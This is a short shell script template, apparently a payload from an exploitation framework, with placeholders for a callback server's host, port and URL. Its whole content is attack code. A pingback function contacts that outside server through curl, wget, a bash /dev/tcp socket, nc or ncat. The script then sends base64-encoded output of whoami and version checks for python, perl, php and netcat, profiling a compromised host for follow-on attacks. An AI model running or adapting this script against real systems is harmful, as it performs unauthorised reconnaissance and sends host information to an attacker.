#!/bin/sh


pingback() {
    if command -v curl > /dev/null 2>&1; then
        curl "{{datastore.srvhost_url}}$1" -o /dev/null
    elif command -v wget >/dev/null 2>&1; then
        wget "{{datastore.srvhost_url}}$1" -O /dev/null
    elif [ -f /bin/bash ]; then
        /bin/bash -c "exec 3<>/dev/tcp/{{datastore.srvhost_domain}}/{{datastore.srvhost_port}} && echo -e \"GET /$1 HTTP/1.1\r\nhttp://{{datastore.srvhost_domain}}\r\nConnection: close\r\n\r\n\" >&3 && cat <&3"
    elif command -v nc > /dev/null 2>&1; then
        printf "GET /$1 HTTP/1.1\r\nhttp://{{datastore.srvhost_domain}}\r\nConnection: close\r\n\r\n" | nc {{datastore.srvhost_domain}} {{datastore.srvhost_port}}
    elif command -v ncat > /dev/null 2>&1; then
        printf "GET /$1 HTTP/1.1\r\nhttp://{{datastore.srvhost_domain}}\r\nConnection: close\r\n\r\n" | ncat {{datastore.srvhost_domain}} {{datastore.srvhost_port}}
    fi
};

pingback "debug/whoami?value=$(whoami 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
pingback "debug/whoami?value=$(whoami 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
pingback "debug/tools/wget?value=$(wget --version 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
pingback "debug/tools/curl?value=$(curl --version 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
pingback "debug/tools/python/?value=$(python --version 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
pingback "debug/tools/python2.7/?value=$(python2 --version 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
pingback "debug/tools/python3/?value=$(python3 --version 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
pingback "debug/tools/nc/?value=$(nc -h 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
pingback "debug/tools/ncat/?value=$(ncat -h 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
pingback "debug/tools/perl/?value=$(perl --version 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
pingback "debug/tools/php/?value=$(php --version 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"

pingback "debug/tools/newest/?value=$(php --version 2>&1 | base64 | tr -d \\n | sed -e 's/+/%2B/g' -e 's#/#%2F#g')"
